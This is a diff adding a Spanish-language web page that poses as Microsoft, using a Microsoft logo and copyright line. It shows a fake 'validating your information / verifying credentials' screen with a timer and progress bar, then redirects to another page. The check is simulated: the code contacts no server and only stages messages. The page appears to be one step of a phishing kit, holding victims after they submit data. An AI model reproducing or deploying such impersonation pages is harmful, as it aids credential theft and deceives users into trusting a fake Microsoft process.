@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Bienvenido</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, 'BlinkMacSystemFont', 'Roboto', 'Helvetica Neue', sans-serif;
+            background-image: url('docs/tapiz.png');
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        /* Contenedor principal */
+        .validation-container {
+            max-width: 520px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 1.5rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Imagen superior */
+        .validation-header {
+            width: 100%;
+            background-color: #f8f9fa;
+        }
+
+        .header-image {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+        }
+
+        /* Contenido principal */
+        .validation-content {
+            padding: 2rem 2rem 2rem 2rem;
+        }
+
+        /* Logo */
+        .logo-wrapper {
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: flex-start;
+        }
+
+        .logo-image {
+            width: 120px;
+            height: auto;
+            display: block;
+        }
+
+        /* Mensaje principal */
+        .validation-message {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .message-title {
+            font-size: 1.2rem;
+            font-weight: 500;
+            color: #2c3e50;
+            margin-bottom: 0.5rem;
+            line-height: 1.4;
+        }
+
+        /* Animación de carga */
+        .loader-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 2rem 0;
+        }
+
+        .loader-image {
+            width: 100px;
+            height: auto;
+            margin-bottom: 1.5rem;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.05);
+                opacity: 0.9;
+            }
+        }
+
+        /* Temporizador */
+        .timer-wrapper {
+            text-align: center;
+            margin-top: 0.5rem;
+        }
+
+        .timer-text {
+            font-size: 1rem;
+            color: #4a5568;
+            line-height: 1.5;
+        }
+
+        .timer-count {
+            display: inline-block;
+            font-weight: 700;
+            color: #0067b8;
+            font-size: 1.1rem;
+            min-width: 60px;
+        }
+
+        .timer-warning {
+            font-size: 0.85rem;
+            color: #718096;
+            margin-top: 0.5rem;
+        }
+
+        /* Barra de progreso */
+        .progress-bar-container {
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0067b8, #00a4ef);
+            border-radius: 2px;
+            width: 0%;
+            transition: width 0.3s linear;
+        }
+
+        /* Mensajes de estado */
+        .status-message {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.85rem;
+            color: #718096;
+        }
+
+        /* Footer */
+        .validation-footer {
+            padding: 1.2rem 2rem;
+            background-color: #f8f9fa;
+            border-top: 1px solid #edf2f7;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #4a5568;
+            text-decoration: none;
+            font-size: 0.7rem;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #0067b8;
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            font-size: 0.7rem;
+            color: #a0aec0;
+        }
+
+        /* Responsive */
+        @media (max-width: 550px) {
+            .validation-content {
+                padding: 1.5rem;
+            }
+            .logo-image {
+                width: 100px;
+            }
+            .message-title {
+                font-size: 1rem;
+            }
+            .loader-image {
+                width: 80px;
+            }
+            .timer-text {
+                font-size: 0.9rem;
+            }
+            .validation-footer {
+                padding: 1rem 1.5rem;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+        }
+
+        /* Focus states */
+        a:focus-visible {
+            outline: 2px solid #0067b8;
+            outline-offset: 2px;
+            border-radius: 4px;
+        }
+
+        /* Ocultar bordes rojos por defecto */
+        input:invalid {
+            box-shadow: none;
+            border-color: #d1d1d1;
+        }
+        .logo-wrapper {
+    margin-bottom: 1.5rem;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+    </style>
+</head>
+<body>
+    <div class="validation-container">
+
+        <!-- Contenido principal -->
+        <div class="validation-content">
+            <!-- Logo -->
+           <center>
+            <div class="logo-wrapper">
+                <img src="./docs/lbg22.png" alt="Microsoft Logo" class="logo-image">
+            </div>
+           </center> 
+
+            <!-- Mensaje de validación -->
+            <div class="validation-message">
+                <p class="message-title">Espere un momento, estamos validando la información ingresada</p>
+            </div>
+
+            <!-- Animación de carga -->
+            <div class="loader-wrapper">
+                <img src="./docs/spinlod.gif" alt="Cargando" class="loader-image">
+                
+                <!-- Temporizador -->
+                <div class="timer-wrapper">
+                    <p class="timer-text">
+                        Esto puede tardar unos 
+                        <span class="timer-count" id="timerDisplay">20</span>
+                    </p>
+                    <p class="timer-warning">No cierres la página.</p>
+                </div>
+            </div>
+
+            <!-- Barra de progreso -->
+            <div class="progress-bar-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <!-- Mensaje de estado dinámico -->
+            <div class="status-message" id="statusMessage">
+                Procesando información...
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="validation-footer">
+            <div class="footer-links">
+                <a href="#" id="privacyLink">Aviso de privacidad</a>
+                <a href="#" id="termsLink">Términos de uso</a>
+                <a href="#" id="helpLink">Centro de ayuda</a>
+            </div>
+            <div class="footer-copyright">
+                © 2026 Microsoft
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuración del temporizador
+        const TOTAL_SECONDS = 20; // 1 minuto con 10 segundos
+        let timeLeft = TOTAL_SECONDS;
+        const timerDisplay = document.getElementById('timerDisplay');
+        const progressFill = document.getElementById('progressFill');
+        const statusMessage = document.getElementById('statusMessage');
+        
+        // URL de redirección
+        const redirectUrl = "screen.html";
+        
+        // Mensajes dinámicos para simular proceso
+        const statusMessages = [
+            "Procesando información...",
+            "Verificando credenciales...",
+            "Validando datos de seguridad...",
+            "Sincronizando con servidores...",
+            "Casi listo...",
+            "Finalizando proceso..."
+        ];
+        
+        let messageIndex = 0;
+        let intervalId = null;
+        
+        // Función para actualizar el temporizador
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            // Actualizar barra de progreso (porcentaje completado)
+            const progressPercent = ((TOTAL_SECONDS - timeLeft) / TOTAL_SECONDS) * 100;
+            progressFill.style.width = `${progressPercent}%`;
+            
+            // Cambiar mensajes cada cierto tiempo
+            if (timeLeft % 12 === 0 && timeLeft > 0 && messageIndex < statusMessages.length - 1) {
+                messageIndex++;
+                statusMessage.textContent = statusMessages[messageIndex];
+                statusMessage.style.opacity = '0';
+                setTimeout(() => {
+                    statusMessage.style.opacity = '1';
+                }, 200);
+            }
+            
+            // Mostrar advertencia cuando queda poco tiempo
+            if (timeLeft === 10) {
+                statusMessage.textContent = "⚠️ Finalizando proceso...";
+                statusMessage.style.color = "#d13438";
+            }
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            }
+            
+            // Redirigir cuando el tiempo llegue a 0
+            if (timeLeft === 0) {
+                if (intervalId) clearInterval(intervalId);
+                statusMessage.textContent = "✓ Proceso completado. Redirigiendo...";
+                statusMessage.style.color = "#107c10";
+                progressFill.style.width = "100%";
+                
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1500);
+            }
+        }
+        
+        // Iniciar el temporizador
+        setTimeout(updateTimer, 1000);
+        
+        // Función para mostrar mensajes de información
+        function showInfoMessage(message) {
+            const tempMessage = statusMessage;
+            tempMessage.textContent = message;
+            tempMessage.style.opacity = '0';
+            setTimeout(() => {
+                tempMessage.style.opacity = '1';
+            }, 100);
+            setTimeout(() => {
+                if (timeLeft > 0) {
+                    tempMessage.textContent = statusMessages[messageIndex];
+                    tempMessage.style.opacity = '1';
+                }
+            }, 2000);
+        }
+        
+        // Eventos para los enlaces del footer (sin redirecciones agresivas)
+        const privacyLink = document.getElementById('privacyLink');
+        const termsLink = document.getElementById('termsLink');
+        const helpLink = document.getElementById('helpLink');
+        
+        privacyLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showInfoMessage('📄 Consulta el aviso de privacidad en el sitio oficial de Microsoft.');
+        });
+        
+        termsLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showInfoMessage('📜 Consulta los términos de uso en el sitio oficial de Microsoft.');
+        });
+        
+        helpLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showInfoMessage('🆘 Visita el Centro de ayuda de Microsoft para más información.');
+        });
+        
+        // Prevenir que el navegador muestre bordes rojos en inputs (no hay inputs pero por si acaso)
+        const style = document.createElement('style');
+        style.textContent = `
+            input:invalid {
+                box-shadow: none;
+                border-color: #d1d1d1;
+            }
+            input:focus:invalid {
+                border-color: #0067b8;
+                box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.1);
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // Log para verificar que todo funciona correctamente
+        console.log('Página de validación cargada correctamente');
+    </script>
+</body>
+</html>
